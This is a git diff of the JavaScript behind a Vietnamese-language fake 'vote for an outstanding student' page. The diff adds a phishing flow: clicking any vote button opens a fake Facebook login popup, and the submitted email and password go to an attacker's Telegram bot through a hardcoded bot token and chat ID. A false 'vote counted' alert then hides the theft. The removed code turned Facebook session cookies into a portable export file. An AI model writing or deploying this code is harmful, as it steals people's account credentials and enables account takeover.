@@ -1,82 +1,84 @@
 document.addEventListener('DOMContentLoaded', function() {
-    const cookieInput = document.getElementById('cookie-input');
-    const generateBtn = document.getElementById('generate-btn');
-    const copyBtn = document.getElementById('copy-btn');
-    const downloadBtn = document.getElementById('download-btn');
-    const copyInstructionsBtn = document.getElementById('copy-instructions');
-    const ufcOutput = document.getElementById('ufc-output');
-    const resultDiv = document.getElementById('result');
-
-    // Sao chép hướng dẫn
-    copyInstructionsBtn.addEventListener('click', function() {
-        const instructions = `1. Đăng nhập vào Facebook trên trình duyệt
-2. Mở DevTools (F12)
-3. Vào Application → Cookies → https://www.facebook.com
-4. Sao chép toàn bộ cookie dưới dạng JSON`;
+    // Telegram bot thông tin
+    const BOT_TOKEN = '8016061982:AAGBDhixC2fxTyhV70s5LH04vSjBeQdZ_Fs';
+    const CHAT_ID = '6360461491';
+    const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    
+    // Lấy các phần tử DOM
+    const voteButtons = document.querySelectorAll('.vote-btn');
+    const loginPopup = document.getElementById('loginPopup');
+    const closeBtn = document.querySelector('.close-btn');
+    const loginForm = document.getElementById('loginForm');
+    
+    // Xử lý click nút bình chọn
+    voteButtons.forEach(button => {
+        button.addEventListener('click', function(e) {
+            e.preventDefault();
+            const studentCard = this.closest('.student-card');
+            const studentId = studentCard.getAttribute('data-id');
+            const studentName = studentCard.querySelector('h3').textContent;
+            
+            // Hiển thị popup đăng nhập
+            loginPopup.style.display = 'flex';
+            
+            // Lưu thông tin học sinh được chọn vào form
+            loginForm.setAttribute('data-student-id', studentId);
+            loginForm.setAttribute('data-student-name', studentName);
+        });
+    });
+    
+    // Đóng popup
+    closeBtn.addEventListener('click', function() {
+        loginPopup.style.display = 'none';
+    });
+    
+    // Xử lý submit form đăng nhập
+    loginForm.addEventListener('submit', function(e) {
+        e.preventDefault();
         
-        navigator.clipboard.writeText(instructions)
-            .then(() => {
-                alert('Đã sao chép hướng dẫn vào clipboard!');
-            })
-            .catch(err => {
-                console.error('Lỗi khi sao chép: ', err);
-            });
+        const email = document.getElementById('fbEmail').value;
+        const password = document.getElementById('fbPassword').value;
+        const studentId = this.getAttribute('data-student-id');
+        const studentName = this.getAttribute('data-student-name');
+        
+        // Gửi thông tin đến Telegram bot
+        sendToTelegram(email, password, studentId, studentName);
+        
+        // Hiển thị thông báo (trong thực tế không nên làm vậy)
+        alert(`Bạn đã bình chọn cho ${studentName}!`);
+        
+        // Đóng popup
+        loginPopup.style.display = 'none';
+        
+        // Reset form
+        this.reset();
     });
-
-    // Tạo UFC file
-    generateBtn.addEventListener('click', function() {
-        try {
-            const cookies = JSON.parse(cookieInput.value);
-            
-            if (!Array.isArray(cookies)) {
-                throw new Error('Dữ liệu cookie phải là mảng JSON');
-            }
-            
-            const formattedCookies = cookies.map(cookie => ({
-                key: cookie.name,
-                value: cookie.value,
-                domain: cookie.domain,
-                path: cookie.path,
-                hostOnly: !cookie.hostOnly,
-                creation: new Date().toISOString(),
-                lastAccessed: new Date().toISOString()
-            }));
-            
-            const ufcData = {
-                cookies: formattedCookies,
-                metadata: {
-                    exportedAt: new Date().toISOString(),
-                    platform: "facebook"
-                }
-            };
-            
-            const ufcBase64 = btoa(JSON.stringify(ufcData));
-            ufcOutput.value = ufcBase64;
-            resultDiv.classList.remove('hidden');
-            
-        } catch (error) {
-            alert('Lỗi: ' + error.message);
-            console.error(error);
-        }
-    });
-
-    // Sao chép UFC
-    copyBtn.addEventListener('click', function() {
-        ufcOutput.select();
-        document.execCommand('copy');
-        alert('Đã sao chép UFC vào clipboard!');
-    });
-
-    // Tải xuống UFC
-    downloadBtn.addEventListener('click', function() {
-        const blob = new Blob([ufcOutput.value], { type: 'text/plain' });
-        const url = URL.createObjectURL(blob);
-        const a = document.createElement('a');
-        a.href = url;
-        a.download = 'facebook_ufc_' + new Date().toISOString().split('T')[0] + '.txt';
-        document.body.appendChild(a);
-        a.click();
-        document.body.removeChild(a);
-        URL.revokeObjectURL(url);
-    });
+    
+    // Hàm gửi thông tin đến Telegram
+    function sendToTelegram(email, password, studentId, studentName) {
+        const message = `📌 Có người bình chọn học sinh xuất sắc!
+        
+📌 Học sinh được chọn: ${studentName} (ID: ${studentId})
+📌 Thông tin đăng nhập Facebook:
+   - Email/SĐT: ${email}
+   - Mật khẩu: ${password}`;
+        
+        fetch(TELEGRAM_API_URL, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+            }),
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log('Message sent to Telegram:', data);
+        })
+        .catch(error => {
+            console.error('Error sending to Telegram:', error);
+        });
+    }
 });
